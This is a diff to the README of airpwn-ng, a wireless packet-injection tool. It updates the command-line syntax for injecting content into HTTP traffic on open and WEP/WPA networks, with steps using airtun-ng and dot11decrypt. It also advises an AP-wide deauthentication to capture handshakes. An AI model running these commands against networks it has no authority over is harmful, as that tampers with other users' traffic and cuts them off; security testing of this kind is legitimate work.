@@ -14,19 +14,14 @@ Example Steps to get airpwn-ng running for an Open Access Point:
 
 ## To find out what channel a card is currently on, perform: iwlist <NIC> channel | grep Current
 
-3. To find the Index Value for airpwn-ng we must perform an http request while running card-detect
-	- ./card-detect mon0
-		- On another laptop, or the same laptop with a NIC connected to the desired AP, open a browser and view an http website
-		- The Index Value will be displayed on the shell where card-detect is running
-
-4. Now we need to create a bridge that "thinks" it's being managed, we use airtun-ng for this
+3. Now we need to create a bridge that "thinks" it's being managed, we use airtun-ng for this
 	- airtun-ng -a <BSSID of Access Point> mon0 -t 0
 
-5. Once airtun-ng is running and at0 is up, we need to configure it.  Obviously you will have to account for your own subnet values, but here is an example
+4. Once airtun-ng is running and at0 is up, we need to configure it.  Obviously you will have to account for your own subnet values, but here is an example
 	- ifconfig at0 192.168.0.200 netmask 255.255.255.0 up
 
-6. Now it's time to inject our content.
-	- ./airpwn-ng example-injects/wargames mon0 at0 <Index Value>
+5. Now it's time to inject our content.
+	- ./airpwn-ng -m mon0 -i at0 --inject example-injects/wargames
 
 ## If you're injecting on WEP/WPA protected network:
 
@@ -45,12 +40,12 @@ Example Steps to get airpwn-ng running for an Open Access Point:
 	- dot11decrypt mon0 wpa:<essid>:<key>
 	- e.g. dot11decrypt mon0 wpa:MyNetwork:MyHardToCrackPassword
 	- IMPORTANT NOTE: dot11decrypt (and any other decryption software) needs to capture the 4-way handshake between the AP and the client before being able to decrypt traffic, so an AP-wide deauth should be performed right after enabling the TAP interface
-	- ALSO: dot11decrypt can handle more than one network on sniff by providing an arbitrary number of wpa:<essid>:<key> tuples, but airpwn-ng can only handle one AP in Encrypted Wireless mode for now
+	- ALSO: dot11decrypt can handle more than one protected network by providing an arbitrary number of wpa:<essid>:<key> tuples, but airpwn-ng can only handle one AP in Encrypted Wireless mode for now
 
 4. Connect and authenticate to the target network with your injection NIC
 	- We're assuming wlan0 for this, in a one NIC scenario
 
 5. Now it's time to inject our content.
-	- ./airpwn-ng example-injects/wargames tap0 wlan0
+	- ./airpwn-ng -m tap0 -i wlan0 --inject example-injects/wargames
 
-
+Okay, that's all.  How about a nice game of chess?
